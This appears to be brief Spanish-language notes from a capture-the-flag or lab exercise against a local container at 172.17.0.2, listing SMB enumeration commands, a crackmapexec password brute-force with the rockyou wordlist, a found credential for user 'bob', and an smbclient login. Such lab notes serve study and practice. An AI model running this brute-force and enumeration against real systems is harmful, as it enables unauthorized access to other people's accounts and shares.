## EXPLOTACION

Sino funciona hydra:
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt

## RECONOCIMIENTO

enum4linux 172.17.0.2 

smbmap -H 172.17.0.2 -P 139

rpcclient -U '' -N 172.17.0.2

smbmap -H 172.17.0.2 -u "bob" -p "star"


## LOGIN

smbclient //172.17.0.2/html -U bob